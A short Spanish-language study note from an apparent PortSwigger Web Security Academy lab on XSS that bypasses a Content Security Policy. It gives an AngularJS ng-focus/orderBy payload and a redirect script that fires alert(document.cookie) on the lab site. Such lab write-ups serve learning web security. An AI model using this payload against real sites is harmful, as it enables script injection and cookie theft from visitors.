----
- tags: #xss #angular #owasp #portswigger 
---
## CSP - Content Security Policy
Es una función de seguridad que ayuda a evitar secuencias de comandos entre sitios (XSS).

![[Pasted image 20250828020948.png]]

## Paso a paso
### Buscamos en el cheat sheet
 [^1] dentro identificamos algún payload que me permita dejar algun elemento al cual acceder con un #.

### Payload
```javascript
<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>
```

### Mensaje
```javascript
<script>
location = 'https://0aa4001103931eaf80c73a7c003e0024.web-security-academy.net/?search=<input id=x+ng-focus=$event.composedPath()|orderBy:%27(z=alert)(document.cookie)%27>#x'
</script>
```

___
## Referencias
[^1]: [cheat sheet xss](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)- portswigger